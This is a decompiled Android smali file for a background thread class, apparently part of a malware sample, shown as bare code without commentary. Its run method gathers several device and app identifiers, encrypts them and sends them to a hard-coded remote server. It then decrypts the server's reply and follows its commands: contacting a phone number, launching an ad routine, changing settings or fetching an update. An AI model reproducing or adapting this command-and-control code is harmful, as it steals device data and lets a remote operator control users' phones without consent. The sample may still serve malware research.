.class Lcom/xxx/yyy/qzl$1;
.super Ljava/lang/Thread;
.source "qzl.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/xxx/yyy/qzl;->GG()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/xxx/yyy/qzl;


# direct methods
.method constructor <init>(Lcom/xxx/yyy/qzl;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    .line 42
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .prologue
    const/4 v9, 0x2

    const-string v6, "&"

    .line 44
    const-string v2, ""

    .line 47
    .local v2, "im":Ljava/lang/String;
    :try_start_0
    new-instance v6, Ljava/lang/StringBuilder;

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$0(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "&"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$1(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$2(Lcom/xxx/yyy/qzl;)I

    move-result v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$3(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$4(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$5(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Lcom/xxx/yyy/ddda;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v2

    .line 53
    :goto_0
    iget-object v6, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "http://adrd.taxuan.net/index.aspx?im="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Lcom/xxx/yyy/qzl;->access$6(Lcom/xxx/yyy/qzl;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 56
    .local v4, "order":Ljava/lang/String;
    :try_start_1
    iget-object v6, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v6}, Lcom/xxx/yyy/qzl;->access$5(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v4, v6}, Lcom/xxx/yyy/ddda;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v4

    .line 62
    :goto_1
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v6

    if-lez v6, :cond_0

    .line 64
    const/4 v6, 0x1

    invoke-virtual {v4, v6}, Ljava/lang/String;->charAt(I)C

    move-result v6

    packed-switch v6, :pswitch_data_0

    .line 96
    :cond_0
    :goto_2
    return-void

    .line 69
    :pswitch_0
    invoke-virtual {v4, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v3

    .line 70
    .local v3, "mdn":Ljava/lang/String;
    new-instance v5, Lcom/xxx/yyy/ssmm;

    invoke-direct {v5}, Lcom/xxx/yyy/ssmm;-><init>()V

    .line 71
    .local v5, "s":Lcom/xxx/yyy/ssmm;
    iget-object v6, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v6}, Lcom/xxx/yyy/qzl;->access$7(Lcom/xxx/yyy/qzl;)Landroid/content/Context;

    move-result-object v6

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$1(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v3, v7}, Lcom/xxx/yyy/ssmm;->Gef(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    .line 77
    .end local v3    # "mdn":Ljava/lang/String;
    .end local v5    # "s":Lcom/xxx/yyy/ssmm;
    :pswitch_1
    new-instance v0, Lcom/xxx/yyy/adad;

    iget-object v6, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v6}, Lcom/xxx/yyy/qzl;->access$1(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v6

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$0(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v7

    iget-object v8, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v8}, Lcom/xxx/yyy/qzl;->access$2(Lcom/xxx/yyy/qzl;)I

    move-result v8

    iget-object v9, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v9}, Lcom/xxx/yyy/qzl;->access$5(Lcom/xxx/yyy/qzl;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v0, v6, v7, v8, v9}, Lcom/xxx/yyy/adad;-><init>(Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)V

    .line 78
    .local v0, "ad":Lcom/xxx/yyy/adad;
    invoke-virtual {v0}, Lcom/xxx/yyy/adad;->StartGo()V

    goto :goto_2

    .line 84
    .end local v0    # "ad":Lcom/xxx/yyy/adad;
    :pswitch_2
    iget-object v6, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-virtual {v4, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Lcom/xxx/yyy/qzl;->access$8(Lcom/xxx/yyy/qzl;Ljava/lang/String;)V

    goto :goto_2

    .line 90
    :pswitch_3
    new-instance v1, Lcom/xxx/yyy/UpdateHelper;

    iget-object v6, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v6}, Lcom/xxx/yyy/qzl;->access$7(Lcom/xxx/yyy/qzl;)Landroid/content/Context;

    move-result-object v6

    iget-object v7, p0, Lcom/xxx/yyy/qzl$1;->this$0:Lcom/xxx/yyy/qzl;

    invoke-static {v7}, Lcom/xxx/yyy/qzl;->access$2(Lcom/xxx/yyy/qzl;)I

    move-result v7

    invoke-direct {v1, v6, v7}, Lcom/xxx/yyy/UpdateHelper;-><init>(Landroid/content/Context;I)V

    .line 91
    .local v1, "helper":Lcom/xxx/yyy/UpdateHelper;
    invoke-virtual {v4, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Lcom/xxx/yyy/UpdateHelper;->Doit(Ljava/lang/String;)V

    goto :goto_2

    .line 58
    .end local v1    # "helper":Lcom/xxx/yyy/UpdateHelper;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 49
    .end local v4    # "order":Ljava/lang/String;
    :catch_1
    move-exception v6

    goto/16 :goto_0

    .line 64
    :pswitch_data_0
    .packed-switch 0x30
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
    .end packed-switch
.end method
